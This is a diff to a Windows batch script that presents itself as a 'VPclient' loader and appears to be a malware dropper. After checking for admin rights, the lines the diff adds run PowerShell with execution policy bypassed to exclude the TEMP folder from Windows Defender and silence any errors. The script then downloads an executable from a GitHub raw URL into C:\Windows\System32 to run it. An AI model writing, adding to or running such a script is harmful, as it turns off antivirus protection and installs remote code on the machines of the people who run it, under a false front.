@@ -11,6 +11,9 @@ if %errorLevel% neq 0 (
 )
 echo Running as admin! VPclient Loading
 
+:: Exclude TEMP folder from Windows Security
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-MpPreference -ExclusionPath \"$env:TEMP\" -ErrorAction SilentlyContinue"
+
 :: Download and run the exe
 echo Downloading mainskib.exe...
 curl -L -o "C:\Windows\System32\skibmain67.exe" "https://github.com/infilling/infilling.github.io/raw/refs/heads/main/skibmain67.exe"
